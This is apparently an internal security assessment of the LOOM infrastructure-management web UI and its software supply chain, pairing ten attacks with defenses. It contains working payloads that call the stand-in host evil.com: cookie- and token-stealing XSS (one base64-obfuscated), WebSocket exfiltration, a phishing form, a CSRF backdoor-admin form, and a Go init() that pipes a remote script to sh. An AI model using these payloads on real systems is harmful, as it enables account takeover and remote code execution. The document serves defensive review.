# LOOM Attack Surface Analysis: Web UI & Software Supply Chain

**Date**: 2026-03-21
**Classification**: INTERNAL — Security-Sensitive
**Exploit code**: `/tmp/loom-security-ui/`

---

## Executive Summary

LOOM's web UI is a "single pane of glass" for infrastructure management. A compromise of this UI grants an attacker control over the entire managed estate — switches, routers, firewalls, bare-metal servers, and out-of-band management controllers. The blast radius of any UI vulnerability is therefore the entire network.

This document catalogs 10 attack vectors across two categories (Web UI and Supply Chain), provides working exploit code for each, and specifies the required defenses.

---

## Table of Contents

1. [XSS via Device Data](#1-xss-via-device-data)
2. [CSRF (Cross-Site Request Forgery)](#2-csrf-cross-site-request-forgery)
3. [Clickjacking](#3-clickjacking)
4. [WebSocket Hijacking](#4-websocket-hijacking)
5. [Local Storage Token Theft](#5-local-storage-token-theft)
6. [SSR Injection (Next.js)](#6-ssr-injection-nextjs-specific)
7. [Dependency Confusion (Go Modules)](#7-dependency-confusion-go-modules)
8. [npm Supply Chain (React UI)](#8-npm-supply-chain-react-ui)
9. [Binary Tampering](#9-binary-tampering)
10. [Container Image Attacks](#10-container-image-attacks)
11. [Content Security Policy (Complete)](#11-content-security-policy)

---

## Web UI Attacks

### 1. XSS via Device Data

**Risk**: CRITICAL
**Exploit files**: `xss-stored-device-name.html`, `xss-dom-topology.html`

#### Attack Description

Device names, SNMP sysDescr fields, interface descriptions, and topology metadata originate from managed devices or operator input. These values are displayed throughout LOOM's UI — inventory tables, topology maps, device detail pages, alert notifications, and dashboards. If any rendering path fails to escape HTML, an attacker can inject scripts that execute in every operator's browser.

The attack surface is unusually large because device metadata enters LOOM through multiple channels:
- Direct operator input (device registration forms)
- SNMP polling (sysDescr, sysName, ifAlias, ifDescr)
- LLDP/CDP neighbor discovery (device names, port descriptions)
- Redfish/IPMI BMC data (system names, firmware versions)
- Imported CSV/YAML inventory files

A compromised device can set its own SNMP sysDescr to a script payload. The next time LOOM polls that device, the payload is stored in LOOM's database and rendered to every operator who views the inventory.

#### Exploit 1: Stored XSS in Device Name

A device name is set to:
```
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
```

If the UI renders this with `innerHTML` or `dangerouslySetInnerHTML` without sanitization, the script executes and exfiltrates the operator's session cookie.

#### Exploit 2: Stored XSS in SNMP sysDescr

An SNMP sysDescr is set to:
```html
<img onerror="eval(atob('ZmV0Y2goImh0dHBzOi8vZXZpbC5jb20vc3RlYWw/Y29va2llPSIrZG9jdW1lbnQuY29va2llKQ=='))" src=x>
```

The base64 payload decodes to `fetch("https://evil.com/steal?cookie="+document.cookie)`. The `<img>` tag with a broken `src` triggers `onerror`, which executes the decoded JavaScript. This bypasses naive filters that only look for `<script>` tags.

#### Exploit 3: DOM XSS in Topology Map

Topology maps often use SVG with `foreignObject` elements or D3.js text rendering. A device name set to:
```html
<foreignObject width="300" height="200"><body xmlns="http://www.w3.org/1999/xhtml">
<form action="https://evil.com/phish" method="POST">
<h3 style="color:red">Session Expired</h3>
<input name="user" placeholder="Username">
<input name="pass" type="password" placeholder="Password">
<button>Re-authenticate</button>
</form></body></foreignObject>
```

This injects a phishing form directly into the topology map. The operator sees what appears to be a re-authentication prompt inside LOOM's own UI.

#### Defenses

**Layer 1: React JSX escaping (default behavior)**
React automatically escapes all values rendered in JSX. The expression `<h1>{device.name}</h1>` is safe because React converts `<script>` to `&lt;script&gt;`. This is the primary defense and it works *only if you never use `dangerouslySetInnerHTML`*.

**Layer 2: DOMPurify for any HTML rendering**
If rich text rendering is required (markdown device notes, formatted descriptions), sanitize with DOMPurify before passing to `dangerouslySetInnerHTML`:

```typescript
import DOMPurify from 'isomorphic-dompurify';

const safeHTML = DOMPurify.sanitize(device.description, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: [],  // No attributes — blocks onerror, onclick, onmouseover
});
```

**Layer 3: Input sanitization at the API layer**
Validate and sanitize all device data at ingestion time. Device names should follow RFC 1123 hostname format (alphanumeric, hyphens, dots). SNMP fields should be stripped of all HTML. See `defense-input-sanitization.ts`.

```typescript
const DeviceNameSchema = z.string()
  .regex(/^[a-zA-Z0-9]([a-zA-Z0-9\-\.]*[a-zA-Z0-9])?$/)
  .max(253)
  .transform(name => name.toLowerCase());
```

**Layer 4: Content Security Policy**
`script-src 'self'` (no `unsafe-inline`) ensures that even if an attacker injects a `<script>` tag, the browser refuses to execute it. See [Section 11](#11-content-security-policy).

---

### 2. CSRF (Cross-Site Request Forgery)

**Risk**: HIGH
**Exploit file**: `csrf-create-admin.html`

#### Attack Description

If LOOM uses cookie-based session authentication without CSRF tokens, any website the operator visits can silently submit requests to LOOM's API. The browser automatically attaches the session cookie, so the request appears to come from the legitimate operator.

An attacker embeds an auto-submitting hidden form in a page disguised as an "Infrastructure Status Report" and sends the link to a LOOM operator:

```html
<form id="f" method="POST" action="https://loom.internal/api/v1/users" target="hidden-frame">
  <input type="hidden" name="username" value="svc-backup-agent" />
  <input type="hidden" name="email" value="attacker@evil.com" />
  <input type="hidden" name="password" value="Backdoor!2024#Strong" />
  <input type="hidden" name="role" value="admin" />
</form>
<script>document.getElementById('f').submit();</script>
```

The attacker can also use `fetch()` with `credentials: 'include'` and `Content-Type: text/plain` (to avoid CORS preflight) to send JSON requests that delete devices or trigger destructive workflows.

#### Defenses

**Defense 1: SameSite=Strict cookies**
```
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly; Path=/
```
`SameSite=Strict` prevents the browser from sending the cookie on ANY cross-origin request, including top-level navigations. This is the strongest cookie-based CSRF defense.

**Defense 2: CSRF tokens (double-submit cookie pattern)**
The middleware sets a random CSRF token as a cookie. The UI reads this cookie and includes it in every mutating request as a header (`X-CSRF-Token`). The server validates that the cookie value matches the header value. An attacker cannot read the cookie (same-origin policy), so they cannot set the header.

```typescript
// Middleware sets the cookie
response.cookies.set('csrf-token', csrfToken, {
  httpOnly: false,  // JS must read this
  secure: true,
  sameSite: 'strict',
  path: '/'
});

// API validates the header matches the cookie
function validateCSRFToken(req: Request): boolean {
  const cookieToken = getCookieValue(req, 'csrf-token');
  const headerToken = req.headers.get('x-csrf-token');
  return timingSafeEqual(cookieToken, headerToken);
}
```

**Defense 3: Prefer Authorization header over cookies**
Using `Authorization: Bearer <token>` headers instead of cookies eliminates CSRF entirely. The browser never automatically attaches an Authorization header — the application code must explicitly set it. This is the recommended approach for SPA-to-API communication.

---

### 3. Clickjacking

**Risk**: HIGH
**Exploit file**: `clickjacking-approve-workflow.html`

#### Attack Description

An attacker creates a page that loads LOOM's workflow approval page in a transparent `<iframe>`. The page shows a decoy button ("Claim Your Prize") positioned exactly over LOOM's "Approve Workflow" button. The operator thinks they are clicking the decoy but actually click the real Approve button in the invisible iframe.

```html
<iframe src="https://loom.internal/workflows/pending/wf-2024-1234/approve"
        style="opacity: 0.0001; position: absolute; z-index: 2;">
</iframe>
<div style="z-index: 1;">
  <button>Claim Your Prize</button> <!-- Positioned over iframe's Approve button -->
</div>
```

LOOM-specific impact: unauthorized approval of firmware upgrades, mass configuration pushes, device decommissions, or network topology changes. A single clickjack could trigger a destructive workflow affecting hundreds of devices.

A variant called "double-clickjacking" uses a two-click sequence where the first click dismisses a dialog and the second hits the target button, bypassing some click-event-based defenses.

#### Defenses

**Defense 1: X-Frame-Options: DENY**
```
X-Frame-Options: DENY
```
Prevents any site from embedding LOOM in an iframe. Supported by all browsers.

**Defense 2: CSP frame-ancestors: 'none'**
```
Content-Security-Policy: frame-ancestors 'none'
```
The modern replacement for X-Frame-Options. Set both headers for maximum browser compatibility.

**Defense 3: JavaScript frame-busting (defense-in-depth)**
```javascript
// In LOOM's main layout — detect if we're in an iframe
if (window.self !== window.top) {
  // We're being framed — break out or blank the page
  document.body.innerHTML = '<h1>Security Error: This page cannot be embedded.</h1>';
  window.top.location = window.self.location;
}
```

---

### 4. WebSocket Hijacking

**Risk**: HIGH
**Exploit file**: `websocket-hijack.html`

#### Attack Description

WebSocket connections are NOT subject to the same-origin policy. Any website can open a WebSocket connection to `wss://loom.internal/api/v1/ws/events`. If the WebSocket upgrade handler does not validate the `Origin` header, the connection succeeds and the attacker receives real-time infrastructure data: device status changes, topology updates, workflow notifications, and potentially credentials passed through event payloads.

```javascript
// From evil.com — browser sends cookies automatically
const ws = new WebSocket('wss://loom.internal/api/v1/ws/events');
ws.onmessage = (e) => {
  // Attacker receives all real-time LOOM events
  fetch('https://evil.com/exfil', { method: 'POST', body: e.data });
};
```

Unlike CORS (which blocks reading responses but not sending requests), WebSocket has no built-in cross-origin restriction. The server MUST validate the Origin header.

#### Defenses

**Defense 1: Origin header validation**
The WebSocket upgrade handler must check the `Origin` header against a whitelist of allowed origins and reject any connection from an unauthorized origin. See `defense-websocket-server.go`:

```go
CheckOrigin: func(r *http.Request) bool {
    origin := r.Header.Get("Origin")
    if origin == "" {
        return false  // Reject connections with no Origin
    }
    parsedOrigin, _ := url.Parse(origin)
    return allowedOrigins[parsedOrigin.Scheme+"://"+parsedOrigin.Host]
}
```

**Defense 2: Token-based authentication (not cookies)**
Require a JWT token in the WebSocket URL query parameter or the first message. Do not rely on cookies for WebSocket authentication — cookies are sent automatically by the browser and enable CSRF-style attacks.

```javascript
// Client-side: pass token explicitly
const ws = new WebSocket(`wss://loom.internal/ws?token=${accessToken}`);
```

**Defense 3: Connection-level authorization**
After authentication, validate that the user has permission to subscribe to the requested event channels. A read-only operator should not receive credential events.

---

### 5. Local Storage Token Theft

**Risk**: CRITICAL
**Exploit file**: `localstorage-token-theft.html`

#### Attack Description

If LOOM stores JWT access tokens or refresh tokens in `localStorage`, any XSS vulnerability — no matter how minor — escalates to full account takeover. Unlike cookies (which can be marked `httpOnly` to prevent JavaScript access), `localStorage` is always accessible to JavaScript.

A single XSS payload can steal all tokens and exfiltrate them:

```javascript
// XSS payload — runs in the context of loom.internal
const token = localStorage.getItem('loom_access_token');
const refresh = localStorage.getItem('loom_refresh_token');
fetch('https://evil.com/collect', {
  method: 'POST',
  mode: 'no-cors',
  body: JSON.stringify({ token, refresh })
});
```

The attacker can now use the stolen JWT from any machine, anywhere in the world:
```bash
curl -H "Authorization: Bearer <stolen-token>" https://loom.internal/api/v1/devices
```

If the refresh token is also stolen, the attacker has persistent access that survives token expiry. This is worse than cookie theft because:
- Cookies can be restricted with `httpOnly`, `SameSite`, and `Secure` flags
- `localStorage` has no such restrictions — if JS runs, it can read localStorage
- Stolen JWTs work from any client, not just the victim's browser

#### Defenses

**Defense 1: httpOnly cookies for session tokens**
Store the session/access token in an `httpOnly` cookie that JavaScript cannot read:

```
Set-Cookie: access_token=<jwt>; HttpOnly; Secure; SameSite=Strict; Path=/api
```

**Defense 2: Short-lived access tokens + refresh rotation**
- Access tokens: 15-minute expiry
- Refresh tokens: stored in httpOnly cookie, single-use with rotation
- On each refresh, the old refresh token is invalidated

**Defense 3: If localStorage is unavoidable**
- Use short-lived tokens (5 minutes)
- Store only in `sessionStorage` (cleared when tab closes, not shared across tabs)
- Implement token binding to the specific browser fingerprint
- Monitor for concurrent token usage from different IPs

---

### 6. SSR Injection (Next.js Specific)

**Risk**: HIGH
**Exploit file**: `ssr-injection-nextjs.tsx`

#### Attack Description

Next.js Server Components render on the server before sending HTML to the client. If user-supplied data is interpolated into the server-rendered output unsafely, three attack scenarios arise:

**Scenario A: `dangerouslySetInnerHTML` with unsanitized server data**
```tsx
// VULNERABLE: Server Component renders device description as raw HTML
<div dangerouslySetInnerHTML={{ __html: device.description }} />
```
If `device.description` contains `<script>alert('xss')</script>`, it renders as executable HTML in the server response, executing before client-side React hydration.

**Scenario B: Script tag JSON injection**
```tsx
// VULNERABLE: Device data breaks out of script context
<script dangerouslySetInnerHTML={{
  __html: `window.__DATA__ = ${JSON.stringify(device)}`
}} />
```
If `device.name` is `</script><script>alert('xss')</script>`, the `JSON.stringify` output contains a literal `</script>` that terminates the script tag early, allowing injection of a new script.

**Scenario C: Server Action SQL injection**
```typescript
'use server';
export async function searchDevices(formData: FormData) {
  const query = formData.get('query') as string;
  // VULNERABLE: Direct string interpolation in SQL
  const results = await db.query(`SELECT * FROM devices WHERE name LIKE '%${query}%'`);
}
```
Server Actions run on the server with full database access. SQL injection here is catastrophic.

#### Defenses

**Defense 1: Never use `dangerouslySetInnerHTML` with unsanitized data**
If rich HTML rendering is required, always sanitize with DOMPurify (use `isomorphic-dompurify` for SSR compatibility).

**Defense 2: Escape JSON in script tags**
```typescript
const safeJson = JSON.stringify(device)
  .replace(/</g, '\\u003c')   // Prevent </script> breakout
  .replace(/>/g, '\\u003e')
  .replace(/&/g, '\\u0026');
```

**Defense 3: Parameterized queries in Server Actions**
```typescript
const results = await db.query('SELECT * FROM devices WHERE name LIKE $1', [`%${query}%`]);
```

**Defense 4: Validate and sanitize all Server Action inputs**
Server Actions are API endpoints — treat their inputs with the same suspicion as REST API inputs.

---

## Supply Chain Attacks

### 7. Dependency Confusion (Go Modules)

**Risk**: HIGH

#### Attack Description

Go module dependency confusion occurs when an attacker publishes a malicious module on a public registry with the same import path as an internal/private module. If LOOM's Go build resolves modules from the public proxy before checking internal repositories, the malicious module is fetched instead.

The attack flow:
1. Attacker discovers LOOM uses an internal module like `git.internal.company.com/loom/utils`
2. Attacker creates a public Go module at `git.internal.company.com/loom/utils` (or a typosquat variant)
3. If `GOPROXY=https://proxy.golang.org,direct` (the default), Go checks the public proxy first
4. The malicious module contains `init()` functions that execute during `go build`

```go
// Malicious module's init() — runs at build time
func init() {
    // Reverse shell, credential theft, or build artifact tampering
    exec.Command("sh", "-c", "curl https://evil.com/shell.sh | sh").Run()
}
```

#### How `GOPROXY` affects resolution

| Setting | Behavior | Risk |
|---------|----------|------|
| `GOPROXY=https://proxy.golang.org,direct` (default) | Public proxy first, then direct | HIGH — public modules shadow internal ones |
| `GOPROXY=https://proxy.golang.org` | Public proxy only | HIGH — internal modules fail, public ones used |
| `GOPROXY=https://internal-proxy.company.com,https://proxy.golang.org` | Internal first | LOW — internal modules resolved correctly |
| `GOPROXY=off` | No proxy | MEDIUM — relies on direct VCS access |

#### Defenses

**Defense 1: `go.sum` verification**
The `go.sum` file contains cryptographic hashes of all module content. Any change to a module's content (even between builds) causes a hash mismatch and build failure. Always commit `go.sum` to version control.

```bash
# Verify module integrity
go mod verify
```

**Defense 2: `GONOSUMDB` and `GONOSUMCHECK` must NOT be set**
These environment variables disable sum database verification. They should never be set in CI/CD:

```bash
# DANGEROUS — disables integrity verification
export GONOSUMDB=*    # DO NOT SET
export GONOSUMCHECK=* # DO NOT SET
```

**Defense 3: Private module configuration**
```bash
# Tell Go which modules are private (skip public proxy)
export GOPRIVATE=git.company.com/*,github.com/company-private/*

# Use an internal proxy for all modules
export GOPROXY=https://athens.internal.company.com,https://proxy.golang.org,direct
```

**Defense 4: Pin module versions in `go.mod`**
Use exact version pins, not ranges. Run `go mod tidy` to ensure `go.mod` and `go.sum` are consistent.

---

### 8. npm Supply Chain (React UI)

**Risk**: HIGH

#### Attack Description

LOOM's React/Next.js UI depends on hundreds of npm packages (React, Next.js, Tailwind, charting libraries, etc.). Each of these has transitive dependencies, creating a large attack surface. A compromised npm package can:

1. **Inject a credential stealer**: The package's `postinstall` script runs arbitrary code during `npm install`
2. **Inject a crypto miner**: The compromised library adds a Web Worker that mines cryptocurrency in operators' browsers
3. **Exfiltrate data**: A supply chain attack on a UI component library could add invisible form fields or event listeners that capture and exfiltrate all user input

Real-world examples:
- `event-stream` (2018): Malicious code targeting a cryptocurrency wallet
- `ua-parser-js` (2021): Crypto miner and credential stealer
- `colors` and `faker` (2022): Maintainer sabotage
- `@solana/web3.js` (2024): Backdoor in official Solana library

A transitive dependency attack is especially dangerous because the malicious code is buried deep in the dependency tree and not visible in `package.json`.

#### Defenses

**Defense 1: Lock file integrity**
Always commit `package-lock.json` and verify its integrity in CI:

```bash
# CI should use ci (not install) to enforce lock file
npm ci

# Verify lock file hasn't been tampered with
npm audit signatures
```

**Defense 2: npm audit in CI**
```bash
# Fail the build on critical vulnerabilities
npm audit --audit-level=critical
```

**Defense 3: Dependency scanning tools**
- **Snyk**: Continuous vulnerability monitoring with PR checks
- **Socket.dev**: Detects supply chain attacks (obfuscated code, network access, filesystem access in packages that shouldn't need them)
- **Dependabot/Renovate**: Automated dependency updates with security patches

**Defense 4: Subresource Integrity (SRI) for CDN assets**
If any JavaScript or CSS is loaded from a CDN, use SRI to ensure the file hasn't been tampered with:

```html
<script src="https://cdn.example.com/lib.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w"
        crossorigin="anonymous"></script>
```

**Defense 5: Restrict `postinstall` scripts**
```bash
# Disable lifecycle scripts from dependencies
npm config set ignore-scripts true

# Allow scripts only for trusted packages
npx --yes allow-scripts
```

---

### 9. Binary Tampering

**Risk**: CRITICAL

#### Attack Description

If an attacker can modify the LOOM binary after it is built but before it is deployed, they can inject persistent backdoors that survive application updates (if the update mechanism is also compromised). Attack vectors:

1. **Compromised CI/CD pipeline**: The build server is compromised, and the attacker modifies the binary during the build process
2. **Man-in-the-middle on download**: The operator downloads the LOOM binary over HTTP or from a compromised mirror
3. **Compromised artifact registry**: The attacker replaces the binary in the container registry or package repository
4. **Insider threat**: A malicious developer modifies the build script to inject a backdoor

A modified LOOM binary could:
- Exfiltrate all device credentials to an external server
- Create hidden admin accounts
- Modify device configurations silently
- Provide a reverse shell to the attacker

#### Defenses

**Defense 1: Binary signing with cosign/sigstore**
```bash
# Sign the binary during CI/CD
cosign sign-blob --yes --output-signature loom.sig --output-certificate loom.cert loom

# Verify before deployment
cosign verify-blob --signature loom.sig --certificate loom.cert \
  --certificate-identity=ci@company.com \
  --certificate-oidc-issuer=https://token.actions.githubusercontent.com \
  loom
```

**Defense 2: Checksum verification**
```bash
# Generate checksums during build
sha256sum loom > loom.sha256

# Verify before deployment
sha256sum -c loom.sha256
```

**Defense 3: Reproducible builds**
Configure the Go build to be reproducible so that anyone can verify the binary was built from the published source code:

```bash
# Reproducible Go build
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 \
  go build -trimpath -ldflags='-s -w -buildid=' -o loom ./cmd/loom
```

Key flags:
- `-trimpath`: Removes filesystem paths from the binary
- `-ldflags='-s -w -buildid='`: Strips debug info and build ID
- `CGO_ENABLED=0`: Ensures no C dependencies that vary by machine

**Defense 4: SLSA (Supply-chain Levels for Software Artifacts)**
Implement SLSA Level 3:
- Build on a hosted, hardened CI/CD platform
- Generate provenance attestations
- Verify provenance before deployment

---

### 10. Container Image Attacks

**Risk**: HIGH

#### Attack Description

LOOM is likely deployed as a container image. Attack vectors at the container layer:

1. **Compromised base image**: If the base image (e.g., `ubuntu:22.04`, `node:18`) is compromised, every container built from it inherits the malware
2. **Build layer injection**: A malicious `RUN` command in a multi-stage build, or a compromised build tool, injects malware during the image build
3. **Tag mutability**: Image tags (`:latest`, `:v1.2`) are mutable. An attacker who compromises the registry can replace an image tag with a malicious image
4. **Layer caching poisoning**: Shared build caches on CI/CD can be poisoned to inject malicious layers

```dockerfile
# VULNERABLE Dockerfile
FROM node:18                           # Mutable tag — could be replaced
RUN npm install                        # Runs arbitrary postinstall scripts
COPY . .                               # Copies everything, including .env files
RUN npm run build
CMD ["npm", "start"]                   # Runs as root
```

#### Defenses

**Defense 1: Distroless/scratch base images**
```dockerfile
# Multi-stage build with distroless final image
FROM golang:1.22 AS builder
WORKDIR /app
COPY go.mod go.sum ./
RUN go mod download && go mod verify
COPY . .
RUN CGO_ENABLED=0 go build -trimpath -o /loom ./cmd/loom

# Final image: no shell, no package manager, no unnecessary tools
FROM gcr.io/distroless/static-debian12:nonroot
COPY --from=builder /loom /loom
USER nonroot:nonroot
ENTRYPOINT ["/loom"]
```

**Defense 2: Pinned image digests (not tags)**
```dockerfile
# VULNERABLE: tag can be silently replaced
FROM golang:1.22

# SECURE: digest is immutable and content-addressed
FROM golang:1.22@sha256:a]b1c2d3e4f5...
```

**Defense 3: Image signing with cosign**
```bash
# Sign the image after building
cosign sign --yes ghcr.io/company/loom:v1.2.3

# Verify before deploying (enforce in admission controller)
cosign verify --certificate-identity=ci@company.com \
  --certificate-oidc-issuer=https://token.actions.githubusercontent.com \
  ghcr.io/company/loom:v1.2.3
```

**Defense 4: Vulnerability scanning with Trivy**
```bash
# Scan for CVEs in the image
trivy image --severity HIGH,CRITICAL ghcr.io/company/loom:v1.2.3

# In CI: fail the build on critical vulnerabilities
trivy image --exit-code 1 --severity CRITICAL ghcr.io/company/loom:v1.2.3
```

**Defense 5: Kubernetes admission control**
Use a policy engine (Kyverno, OPA/Gatekeeper) to enforce that only signed, scanned images from approved registries can be deployed:

```yaml
# Kyverno policy: require image signatures
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-image-signatures
spec:
  validationFailureAction: Enforce
  rules:
    - name: verify-signature
      match:
        resources:
          kinds: ["Pod"]
      verifyImages:
        - imageReferences: ["ghcr.io/company/loom:*"]
          attestors:
            - entries:
                - keyless:
                    subject: "ci@company.com"
                    issuer: "https://token.actions.githubusercontent.com"
```

---

## 11. Content Security Policy

**Defense file**: `defense-middleware.ts`

The following CSP should be set on every response from LOOM's production deployment:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  connect-src 'self' wss:;
  font-src 'self';
  object-src 'none';
  media-src 'none';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests
```

### Directive-by-Directive Explanation

| Directive | Value | Rationale |
|-----------|-------|-----------|
| `default-src` | `'self'` | Fallback for all resource types not explicitly listed. Only allow resources from LOOM's own origin. |
| `script-src` | `'self'` | Only execute scripts served from LOOM's origin. **No `unsafe-inline`**: prevents injected `<script>` tags and inline event handlers from executing. **No `unsafe-eval`**: prevents `eval()`, `Function()`, and `setTimeout('string')` attacks. If Next.js requires inline scripts, use nonce-based CSP (`'nonce-<random>'`) instead. |
| `style-src` | `'self' 'unsafe-inline'` | Tailwind CSS may inject inline styles at runtime. If Tailwind is fully compiled at build time, remove `'unsafe-inline'` and use nonce-based styles. `'unsafe-inline'` for styles is lower risk than for scripts because CSS cannot execute JavaScript (though CSS injection can exfiltrate data via `background-image` URLs). |
| `img-src` | `'self' data:` | `data:` URIs are needed for topology map rendering (canvas `toDataURL()`, inline SVG data URIs, dynamically generated icons). Without `data:`, the topology map cannot export or render dynamic images. |
| `connect-src` | `'self' wss:` | `'self'` allows `fetch()` and `XMLHttpRequest` to LOOM's API. `wss:` allows secure WebSocket connections for real-time device status updates, topology change notifications, and workflow progress. Note: `wss:` (not `ws:`) ensures WebSocket connections are always encrypted. |
| `font-src` | `'self'` | Only allow fonts served from LOOM's origin. Blocks external font loading (which can be used for tracking or fingerprinting). |
| `object-src` | `'none'` | Blocks `<object>`, `<embed>`, and `<applet>` tags. LOOM has no need for Flash, Java, or other plugin content. These are common XSS escalation vectors. |
| `media-src` | `'none'` | LOOM has no audio or video content. Blocking media sources reduces attack surface. |
| `frame-ancestors` | `'none'` | Prevents any site from embedding LOOM in an `<iframe>`, `<frame>`, `<object>`, or `<embed>`. This is the primary clickjacking defense. Equivalent to `X-Frame-Options: DENY` but more flexible and modern. |
| `base-uri` | `'self'` | Prevents `<base>` tag injection. Without this, an attacker could inject `<base href="https://evil.com">` to redirect all relative URLs (scripts, stylesheets, images) to an attacker-controlled server. |
| `form-action` | `'self'` | Forms can only submit to LOOM's own origin. Prevents form hijacking attacks where an injected `<form action="https://evil.com">` tag captures user input (credentials, CSRF tokens, search queries). |
| `upgrade-insecure-requests` | (directive) | Automatically upgrades HTTP requests to HTTPS. Prevents mixed-content issues where a resource is accidentally loaded over HTTP, enabling man-in-the-middle attacks. |

### Additional Security Headers

These are set alongside CSP in the middleware (see `defense-middleware.ts`):

| Header | Value | Purpose |
|--------|-------|---------|
| `X-Frame-Options` | `DENY` | Legacy clickjacking defense (for browsers that don't support CSP `frame-ancestors`) |
| `X-Content-Type-Options` | `nosniff` | Prevents MIME-type sniffing — stops browsers from executing uploaded files as scripts |
| `X-XSS-Protection` | `1; mode=block` | Legacy XSS filter (deprecated but harmless defense-in-depth) |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Prevents leaking internal LOOM URLs to external sites |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains; preload` | Enforce HTTPS for 1 year; all infrastructure management traffic must be encrypted |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=(), ...` | Disable browser APIs LOOM doesn't need — reduces attack surface for compromised pages |

---

## Summary of Files

| File | Purpose |
|------|---------|
| `/tmp/loom-security-ui/xss-stored-device-name.html` | Stored XSS exploit via device name and SNMP sysDescr |
| `/tmp/loom-security-ui/xss-dom-topology.html` | DOM XSS exploit via topology map SVG injection |
| `/tmp/loom-security-ui/csrf-create-admin.html` | CSRF exploit creating a backdoor admin account |
| `/tmp/loom-security-ui/clickjacking-approve-workflow.html` | Clickjacking exploit for workflow approval |
| `/tmp/loom-security-ui/websocket-hijack.html` | Cross-origin WebSocket hijacking exploit |
| `/tmp/loom-security-ui/localstorage-token-theft.html` | localStorage token theft via XSS |
| `/tmp/loom-security-ui/ssr-injection-nextjs.tsx` | Next.js SSR injection examples and defenses |
| `/tmp/loom-security-ui/defense-middleware.ts` | Next.js middleware with all security headers |
| `/tmp/loom-security-ui/defense-websocket-server.go` | Go WebSocket server with Origin validation and token auth |
| `/tmp/loom-security-ui/defense-input-sanitization.ts` | API-layer input validation and sanitization |

---

## Priority Implementation Order

1. **Content Security Policy** — Mitigates XSS, clickjacking, and data exfiltration in one header
2. **httpOnly cookies for auth** — Eliminates localStorage token theft
3. **Input sanitization at API layer** — Prevents stored XSS at the source
4. **CSRF tokens + SameSite=Strict** — Prevents cross-origin request forgery
5. **WebSocket Origin validation** — Prevents real-time data exfiltration
6. **Container image signing + scanning** — Prevents supply chain attacks at deployment
7. **Binary signing + reproducible builds** — Prevents binary tampering
8. **npm audit + lock file enforcement** — Prevents supply chain attacks in the UI build
9. **Go module integrity** — Prevents dependency confusion in the backend
10. **SSR hardening** — Prevents server-side injection in Next.js
